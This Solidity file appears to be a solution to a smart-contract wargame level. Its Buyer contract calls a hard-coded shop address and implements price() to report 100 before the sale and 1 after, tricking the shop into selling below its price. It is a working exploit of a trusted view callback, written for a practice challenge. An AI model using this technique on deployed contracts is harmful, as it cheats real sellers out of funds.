// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface Shop {
    function buy() external ;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract Buyer {
    bool private flag = false;

    function buy() external {
        address levelContractAddress = 0x3eE47fec4dcBEAF54Df1c897978EeE12f6c9889A;
        Shop s = Shop(levelContractAddress);
        s.buy();
    }

    function price() external view returns (uint256)
    {
        address levelContractAddress = 0x3eE47fec4dcBEAF54Df1c897978EeE12f6c9889A;
        Shop s = Shop(levelContractAddress);
        return s.isSold() ? 1 : 100;
    }
}
